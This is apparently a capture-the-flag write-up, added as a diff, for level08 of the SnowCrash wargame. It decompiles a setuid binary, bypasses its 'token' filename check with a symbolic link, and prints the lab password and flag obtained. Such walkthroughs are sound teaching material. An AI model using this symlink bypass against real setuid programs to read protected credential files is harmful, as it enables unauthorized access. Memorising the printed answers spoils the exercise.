@@ -1,0 +1,39 @@
+List home file
+	-rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08
+
+We try ./level08
+	-> ./level08 [file to read]
+	-> nothing as is
+
+Copy scp -P 4242 level08@10.11.200.52:~/level08 .
+	NSA reverse tool (the best and free) Ghidra : https://ghidra-sre.org/
+	/*
+		if (argc == 1) {
+			printf("%s [file to read]\n",*argv);
+							// WARNING: Subroutine does not return
+			exit(1);
+		}
+		pcVar1 = strstr(argv[1],"token");
+		if (pcVar1 != (char *)0x0) {
+			printf("You may not access \'%s\'\n",argv[1]);
+							// WARNING: Subroutine does not return
+			exit(1);
+		}
+		__fd = open(argv[1],0);
+		if (__fd == -1) {
+			err(1,"Unable to open %s",argv[1]);
+		}
+	*/
+	-> strstr our file should not named token
+
+We add a symbolic link in tmp ln -s ~/token /tmp/access
+
+level08@SnowCrash:~$ ./level08 /tmp/access
+quif5eloekouj29ke0vouxean
+	-> su level09 don't work
+
+level08@SnowCrash:~$ su flag08
+Password:
+Don't forget to launch getflag !
+flag08@SnowCrash:~$ getflag
+Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
